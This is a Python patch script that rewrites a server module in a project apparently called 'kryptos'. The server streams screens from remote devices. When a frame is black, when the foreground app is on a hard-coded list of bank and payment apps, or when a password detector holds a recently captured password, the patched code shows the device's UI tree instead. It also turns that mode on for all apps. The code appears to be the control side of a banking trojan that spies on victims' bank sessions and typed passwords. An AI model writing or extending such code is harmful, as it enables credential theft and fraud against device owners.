import io
p = r"C:\Users\user\kryptos\server\main.py"
s = io.open(p, encoding="utf-8", newline="").read()

# 1) black check -> hilo aparte
a = s.index("        if now_ts - _bc_ts.get(device_id, 0.0) >= (0.15 if _tree_live else 0.5):")
b = s.index("            _tv[device_id] = _is_black", a) + len("            _tv[device_id] = _is_black")
newbc = '''        if now_ts - _bc_ts.get(device_id, 0.0) >= (0.30 if _tree_live else 0.5):
            _bc_ts[device_id] = now_ts
            try:
                _is_black = await asyncio.to_thread(self._is_black_jpeg, jpeg_data)
            except Exception:
                _is_black = False
            _tv[device_id] = _is_black'''
s = s[:a] + newbc + s[b:]

# 2) condicao: arvore/CLAVE em qualquer app + sem broadcast duplicado
c = s.index('        _fg = (self.device_info.get(device_id, {}) or {}).get("foreground_package", "") or ""')
k = s.index("if _is_black and (_tree_live or _is_bank):", c)
d = s.index("\n                return", k) + len("\n                return")
newcond = '''        _fg = (self.device_info.get(device_id, {}) or {}).get("foreground_package", "") or ""
        _is_bank = any(k in _fg.lower() for k in ("banco", "bank", "nequi", "davivienda", "daviplata", "bancolombia", "bogota", "itau", "bradesco", "santander", "nubank", "caixa", "bbva", "scotiabank", "popular", "picpay", "mercadopago", "neon"))
        _has_pwd = False
        try:
            _proc = getattr(self, "password_detector", {}).get(device_id)
            if _proc is not None:
                _buf = getattr(_proc, "password_buffer", None) or []
                _le = getattr(_proc, "last_event_time", None)
                if _buf and _le is not None:
                    try:
                        _has_pwd = (utc_now() - _le).total_seconds() < 10
                    except Exception:
                        _has_pwd = True
        except Exception:
            _has_pwd = False
        if (_is_black and (_tree_live or _is_bank)) or _has_pwd:
            self.maybe_render_tree(device_id)
            if self.device_screens.get(device_id):
                return'''
s = s[:c] + newcond + s[d:]

# 3) metodo auxiliar
marker = "    async def store_screen_frame(self, device_id: str, jpeg_data: bytes):"
helper = '''    def _is_black_jpeg(self, jpeg_data: bytes) -> bool:
        try:
            from io import BytesIO as _B
            from PIL import Image as _I
            _im = _I.open(_B(jpeg_data)).convert("L").resize((24, 48))
            _bb = _im.tobytes()
            return (sum(_bb) / float(len(_bb))) < 6.0
        except Exception:
            return False

'''
s = s.replace(marker, helper + marker, 1)

# 4) arvore em live para TODOS os apps
s = s.replace('setdefault("_TREE_IN_LIVE", False)', 'setdefault("_TREE_IN_LIVE", True)')

io.open(p, "w", encoding="utf-8", newline="").write(s)
print("OK live")